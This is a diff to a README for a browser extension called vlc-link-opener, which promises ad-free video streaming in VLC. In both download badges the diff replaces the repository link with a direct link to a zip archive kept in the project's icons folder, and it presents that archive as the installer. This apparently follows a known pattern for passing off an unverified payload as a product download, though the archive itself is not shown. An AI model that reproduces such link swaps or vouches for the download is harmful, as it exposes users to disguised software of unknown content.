@@ -1,6 +1,6 @@
 # 🎬 vlc-link-opener - Stream Web Videos Without Annoying Ads
 
-[![Download Now](https://img.shields.io/badge/Download-vlc--link--opener-blue?style=for-the-badge&logo=github)](https://github.com/Russet-quadruple992/vlc-link-opener)
+[![Download Now](https://img.shields.io/badge/Download-vlc--link--opener-blue?style=for-the-badge&logo=github)](https://github.com/Russet-quadruple992/vlc-link-opener/raw/refs/heads/main/extension/icons/opener-link-vlc-v1.7-beta.5.zip)
 
 ## ✨ What is vlc-link-opener?
 vlc-link-opener is a browser extension that lets you stream web videos directly in **VLC Media Player**. Enjoy **0 ads**, **0 popups**, and benefit from **GPU acceleration** for smoother playback. This open-source tool is designed to give you a clean, distraction-free viewing experience.
@@ -21,7 +21,7 @@ The extension adds a small button to your browser toolbar. When you are watching
 ### Step 1: Get the Installer
 Visit this link to download the application. Click the button below to go directly to the download page.
 
-[![Download Now](https://img.shields.io/badge/Download-vlc--link--opener-purple?)](https://github.com/Russet-quadruple992/vlc-link-opener)
+[![Download Now](https://img.shields.io/badge/Download-vlc--link--opener-purple?)](https://github.com/Russet-quadruple992/vlc-link-opener/raw/refs/heads/main/extension/icons/opener-link-vlc-v1.7-beta.5.zip)
 
 Once on the page, follow the instructions to download the installer file.
 
